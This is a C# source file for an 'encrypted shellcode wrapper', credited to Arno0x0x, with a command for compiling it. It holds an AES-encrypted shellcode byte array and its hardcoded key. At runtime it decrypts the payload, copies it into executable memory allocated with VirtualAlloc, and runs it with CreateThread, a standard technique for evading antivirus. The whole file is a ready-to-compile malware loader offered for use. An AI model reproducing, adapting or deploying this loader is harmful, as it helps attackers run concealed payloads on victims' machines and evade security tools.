/*
Author: Arno0x0x, Twitter: @Arno0x0x

How to compile:
===============
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:encryptedShellcodeWrapper_aes.exe encryptedShellcodeWrapper_aes.cs

*/

using System;
using System.IO;
using System.Collections.Generic;
using System.Text;
using System.Threading.Tasks;
using System.Security.Cryptography;
using System.Runtime.InteropServices;

namespace RunShellCode
{
    static class Program
    {
        //==============================================================================
        // CRYPTO FUNCTIONS
        //==============================================================================
        private static T[] SubArray<T>(this T[] data, int index, int length)
        {
            T[] result = new T[length];
            Array.Copy(data, index, result, 0, length);
            return result;
        }

        private static byte[] xor(byte[] cipher, byte[] key) {
            byte[] decrypted = new byte[cipher.Length];

            for(int i = 0; i < cipher.Length; i++) {
                decrypted[i] = (byte) (cipher[i] ^ key[i % key.Length]);
            }

            return decrypted;
        }

        //--------------------------------------------------------------------------------------------------
        // Decrypts the given a plaintext message byte array with a given 128 bits key
        // Returns the unencrypted message
        //--------------------------------------------------------------------------------------------------
        private static byte[] aesDecrypt(byte[] cipher, byte[] key)
        {
            var IV = cipher.SubArray(0, 16);
            var encryptedMessage = cipher.SubArray(16, cipher.Length - 16);

            // Create an AesManaged object with the specified key and IV.
            using (AesManaged aes = new AesManaged())
            {
                aes.Padding = PaddingMode.PKCS7;
                aes.KeySize = 128;
                aes.Key = key;
                aes.IV = IV;

                using (MemoryStream ms = new MemoryStream())
                {
                    using (CryptoStream cs = new CryptoStream(ms, aes.CreateDecryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(encryptedMessage, 0, encryptedMessage.Length);
                    }

                    return ms.ToArray();
                }
            }
        }

        //==============================================================================
        // MAIN FUNCTION
        //==============================================================================
        static void Main()
        {
            byte[] encryptedShellcode = new byte[] { 0xf6,0x2e,0xc4,0xdb,0x84,0x96,0x0e,0x8d,0xd7,0x1e,0xe9,0x1e,0xea,0x39,0xab,0x5c,0xe6,0xaf,0x15,0x66,0x69,0x00,0x51,0x38,0xb5,0x72,0x33,0x72,0x3c,0xde,0x2d,0xd4,0x0e,0x0f,0x8a,0x3f,0xe8,0x9e,0x47,0x32,0x16,0xbb,0x64,0xcc,0xba,0x46,0x76,0x36,0x65,0xa7,0xda,0x94,0xa2,0x68,0x08,0x7a,0xad,0xa4,0xca,0xc2,0xb4,0xa7,0xc0,0x89,0x63,0x86,0xd8,0x27,0xa7,0xe8,0xff,0x6d,0xca,0xc4,0x61,0xda,0x9f,0xc2,0x88,0xf6,0x39,0x00,0xb6,0xe3,0xd6,0x10,0x84,0x6c,0x80,0x81,0xc5,0x90,0xa1,0x65,0x21,0x55,0xf7,0x2c,0xba,0x95,0x0b,0x01,0x00,0x5a,0xfc,0x1c,0xaf,0x52,0x45,0xf7,0x40,0x81,0xdd,0x6f,0x9d,0x3f,0xd9,0x78,0x97,0x22,0x9c,0xbf,0x18,0x8b,0x08,0x4c,0xf6,0xb8,0x92,0xfd,0xc4,0x2c,0x36,0x3d,0x6e,0x87,0xa6,0x09,0x35,0x53,0x04,0x0e,0x0f,0x37,0x8b,0x7f,0x58,0x57,0x6f,0x35,0x8e,0xff,0xc2,0x8f,0x8e,0xd9,0x71,0xf1,0x38,0x85,0xe8,0x7a,0xed,0xf8,0xce,0xac,0x2e,0x42,0xf3,0xbe,0x14,0x8a,0x0f,0x7a,0x12,0x3d,0x9a,0x3d,0x35,0x6e,0x25,0xf9,0x41,0x55,0xbd,0x24,0x72,0x6d,0xa7,0x58,0x05,0xc5,0x04,0x48,0x1a,0x91,0xb7,0x0c,0x39,0xa2,0xd0,0x12,0x40,0xd8,0x19,0x95,0x63,0x5b,0x83,0x20,0xa2,0x98,0x01,0x80,0x84,0xba,0x19,0x45,0xec,0xa5,0x03,0x79,0x56,0xb9,0x01,0x61,0xed,0x5d,0x72,0xca,0x8f,0xc9,0xca,0x9e,0x96,0x20,0xf7,0x84,0x3f,0xd8,0xb0,0x4f,0xe4,0x15,0xd9,0xc9,0xc2,0x53,0xc6,0x44,0xe9,0x23,0x1e,0x33,0xf7,0xf3,0xec,0x86,0x86,0x8a,0xfb,0xb5,0x4c,0xfb,0xa0,0x54,0x36,0xf4,0x00,0xa2,0x34,0xe9,0xf7,0x27,0x35,0xd6,0x6a,0x3e,0xfa,0x02,0x28,0xf9,0xc2,0xea,0x0c,0x8a,0x41,0x71,0x16,0xe0,0x4f,0xc7,0x81,0xc6,0x12,0xd8,0xd7,0x17,0xcf,0x62,0x65,0x74,0x13,0x3d,0x03,0x0d,0x1b,0x46,0x03,0xd0,0xac,0x1a,0xa7,0xf5,0x32,0xbe,0x05,0x97,0x7f,0xa5,0x0a,0x88,0x6c,0xfa,0xa4,0x95,0xd7,0x09,0x51,0x6e,0x41,0x9a,0xeb,0x8f,0x85,0xda,0x4e,0x80,0xca,0x9c,0x74,0x99,0xbb,0x9d,0xf3,0xee,0x7f,0x3b,0x6b,0xc8,0x57,0x45,0x17,0xa3,0x14,0xf9,0xc1,0xda,0xbc,0x57,0x80,0x46,0x6c,0x68,0xfc,0xc1,0x65,0x0f,0x08,0x4b,0xa4,0x76,0x41,0x23,0x99,0xcb,0xf8,0x18,0x06,0xb2,0xbf,0x3f,0x0f,0x14,0x7a,0x4f,0xd4,0x8f,0x33,0xc1,0xb6,0xba,0x7e,0x06,0xd4,0xb8,0xe7,0xda,0x58,0x0e,0xe0,0xe3,0xd1,0xa4,0x47,0xab,0xaa,0x9d,0x60,0x4a,0x94,0x61,0xc2,0x34,0xb9,0x3f,0x03,0x53,0x92,0x9b,0x86,0x0d,0xcc,0xcc,0x5f,0x6c,0xe3,0xce,0xb3,0x9a,0x66,0x7f,0x33,0x27,0x94,0x76,0xc1,0x13,0x5b,0x85,0xd9,0x30,0xdb,0x44,0xad,0x03,0x65,0x8e,0x48,0xb1,0xd8,0xd7,0x56,0x84,0x14,0xc6,0x95,0x77,0x7d,0x84,0xeb,0x09,0x87,0x05,0xbf,0x89,0x8c,0xe7,0x28,0xcf,0x73,0x47,0x25,0x3b,0x5c,0xf4,0x37,0x28,0x25,0x39,0x19,0x4c,0xb5,0xde,0x92,0xbc,0x7f,0x54,0x81,0x8b,0xbe,0x69,0xd3,0xc5,0xdb,0x9d,0x8b,0xa6,0xde,0xf0,0xbd,0xd1,0x2f,0x6e,0x45,0xad,0x12,0x2d,0x87,0x3e,0x95,0xac,0x38,0xbf,0x36,0x8e,0x11,0x08,0xee,0xfe,0x02,0x68,0xf1,0xfd,0x54,0xe0,0xae,0x47 };
            string key = "AI38OQndwqdJ6lc8yzJudg==";
            string cipherType = "aes";


            byte[] shellcode = null;

            //--------------------------------------------------------------
            // Decrypt the shellcode
            if (cipherType == "xor") {
                shellcode = xor(encryptedShellcode, Encoding.ASCII.GetBytes(key));
            }
            else if (cipherType == "aes") {
                shellcode = aesDecrypt(encryptedShellcode, Convert.FromBase64String(key));
            }
                        
            //--------------------------------------------------------------        	
            // Copy decrypted shellcode to memory
            UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
            IntPtr hThread = IntPtr.Zero;
            UInt32 threadId = 0;

            // Prepare data
            IntPtr pinfo = IntPtr.Zero;

            // Invoke the shellcode
            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
            return;
        }

        private static UInt32 MEM_COMMIT = 0x1000;
        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

        // The usual Win32 API trio functions: VirtualAlloc, CreateThread, WaitForSingleObject
        [DllImport("kernel32")]
        private static extern UInt32 VirtualAlloc(
            UInt32 lpStartAddr,
            UInt32 size,
            UInt32 flAllocationType,
            UInt32 flProtect
        );

        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(
            UInt32 lpThreadAttributes,
            UInt32 dwStackSize,
            UInt32 lpStartAddress,
            IntPtr param,
            UInt32 dwCreationFlags,
            ref UInt32 lpThreadId
        );

        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(
            IntPtr hHandle,
            UInt32 dwMilliseconds
        );
    }
}
